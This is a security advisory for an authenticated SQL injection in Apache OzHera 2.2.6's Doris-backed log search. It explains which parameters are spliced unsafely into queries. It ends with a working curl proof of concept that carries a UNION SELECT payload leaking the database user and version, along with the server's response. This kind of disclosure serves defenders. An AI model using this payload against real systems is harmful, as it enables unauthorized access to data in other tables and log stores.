@@ -1,0 +1,72 @@
+
+
+Apache OzHera 2.2.6 Authenticated SQL Injection
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://ozhera.apache.org
+Affected version: 2.2.6-incubating
+
+Summary: Apache OzHera(Incubating) is an Application Performance
+Monitoring (APM) platform designed for the cloud-native era. It
+revolves around applications and integrates capabilities such as
+metric monitoring, distributed tracing, logging, and alerting. The
+platform's mission is to enhance the online stability of applications
+and enable businesses to detect and locate issues within 1 minute
+and 5 minutes, respectively, when problems occur.
+
+Desc: Apache OzHera is affected by a SQL injection vulnerability
+in its Doris-backed log search. In EsDataServiceImpl, the log-search
+query is built by string-interpolating user-supplied request parameters
+and executed on a plain Statement (createStatement().executeQuery)
+with no parameterization or escaping, against the Doris log store.
+The injectable parameters are the full-text search term (fullTextSearch,
+spliced as a WHERE condition in buildQuerySql and in the statistics
+path buildQuerySqlConditional), the sort key (sortKey, spliced after
+ORDER BY), and the tail selector (tail, quoted and spliced into a tail
+IN (...) clause). Numeric parameters (startTime/endTime/page/pageSize)
+are not injectable, and Elasticsearch-backed log stores use a different,
+unaffected code path. An authenticated console user can inject SQL and
+read data beyond the intended query, including other tables and log
+stores within the same Doris instance.
+
+Tested on: Eclipse Temurin OpenJDK 21.0.6 (LTS)
+           H2 in-memory
+           MySQL mode
+           Apache Doris
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-6012
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6012
+
+
+13.08.2026
+
+--
+
+
+$ curl -s 'http://TARGET:8080/api/log/query?storeId=251\
+> &startTime=0\
+> &endTime=9999999999999\
+> &fullTextSearch=1%3D0%20UNION%20SELECT%20NULL%2CNULL%2CCONCAT(%27ZSLSQLI%3A%27%2CCURRENT_USER()%2C%27%7C%27%2CVERSION())%2CNULL%2CNULL%2CNULL%20--%20-' \
+> -H 'Cookie: SESSION=8f3a1c9e-4b27-4d6a-9f1e-2a7c5b0d6e11; token=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJhZG1pbiJ9.sig'\
+> # 1=0 UNION SELECT NULL,NULL,CONCAT('ZSLSQLI:',CURRENT_USER(),'|',VERSION()),NULL,NULL,NULL -- -
+
+{
+  "code": 0,
+  "message": "success",
+  "data": {
+    "total": 1,
+    "list": [
+      {
+        "timestamp": null,
+        "message": "ZSLSQLI:root@%|5.7.99",
+        "tag": null
+      }
+    ]
+  }
+}
